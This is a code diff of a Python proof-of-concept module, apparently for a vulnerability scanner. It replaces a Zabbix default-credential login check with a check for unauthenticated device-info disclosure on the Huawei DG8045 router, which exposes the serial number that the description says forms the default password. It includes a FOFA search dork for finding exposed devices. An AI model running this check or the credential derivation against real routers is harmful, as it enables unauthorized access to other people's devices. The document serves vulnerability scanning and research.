@@ -11,23 +11,23 @@ class POC(POCBase):
     _info = {
         "author" : "jijue",                      # POC作者
         "version" : "1",                    # POC版本，默认是1  
-        "CreateDate" : "2021-06-09",        # POC创建时间
-        "UpdateDate" : "2021-06-09",        # POC创建时间
+        "CreateDate" : "2022-01-01",        # POC创建时间
+        "UpdateDate" : "2022-01-01",        # POC创建时间
         "PocDesc" : """
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Zabbix弱口令",                        # 漏洞名称
-        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Zabbix",                     # 漏洞应用名称
-        "AppVersion" : "",                  # 漏洞应用版本
-        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
+        "name" : "华为路由器敏感信息泄露 DG8045 Router 1.0",                        # 漏洞名称
+        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "华为DG8045路由器",                     # 漏洞应用名称
+        "AppVersion" : "1.0版本",                  # 漏洞应用版本
+        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            zabbix默认口令是 Admin : zabbix
+            路由器默认密码是序列号的最后8位
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="ZABBIX-监控系统"
+            app="DG8045-Home-Gateway-DG8045"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -42,27 +42,22 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "" # url自己按需调整
-        data = "name=Admin&password=zabbix&autologin=1&enter=Sign+in"
+        url = self.target + "/api/system/deviceinfo" # url自己按需调整
+        
 
         headers = {
                     "User-Agent":get_random_ua(),
                     "Connection":"close",
-                    "Content-Type": "application/x-www-form-urlencoded",
+                    "X-Requested-With": "XMLHttpRequest",
+                    # "Content-Type": "application/x-www-form-urlencoded",
                     }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "chkbxRange.init();" in req.text \
-                and \
-                    "incorrect" not in req.text \
-                        and \
-                            "<!-- Login Form -->" not in req.text \
-                                and \
-                                    req.status_code == 200:
+            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            if "SerialNumber" in req.text and "DeviceName" in req.text:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
